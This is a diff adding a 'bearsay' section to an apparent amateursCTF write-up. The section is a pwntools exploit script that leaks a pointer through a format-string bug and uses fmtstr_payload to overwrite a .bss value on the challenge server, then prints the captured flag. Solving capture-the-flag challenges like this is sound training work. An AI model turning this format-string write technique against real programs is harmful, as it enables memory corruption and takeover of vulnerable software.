@@ -112,3 +112,32 @@ print(flag)
 ```
 
 **amateursCTF{4t_l3ast_th15_fl4g_isn7_misspelll3d}**
+
+## bearsay
+
+```Python
+from pwn import *
+
+elf = context.binary = ELF('./chall')
+p = process()
+p = remote('chal.amt.rs', 1338)
+# gdb.attach(p, gdbscript='b*main', api=True) 
+
+p.sendlineafter(b'say: ', b'%15$p')
+p.recvline()
+
+bss_is_mother = int(p.recvline().split()[1], 16) + 0x29cc
+val = 0xBAD0BAD
+payload = fmtstr_payload(22, {bss_is_mother: val}, write_size='int')
+p.recvuntil(b'say: ')
+print(len(payload))
+print(payload)
+assert len(payload) < 4096
+p.sendline(payload)
+
+p.recvuntil(b'say: ')
+p.sendline( b'flag')
+p.interactive()
+```
+
+**amateursCTF{bearsay_mooooooooooooooooooo?}**
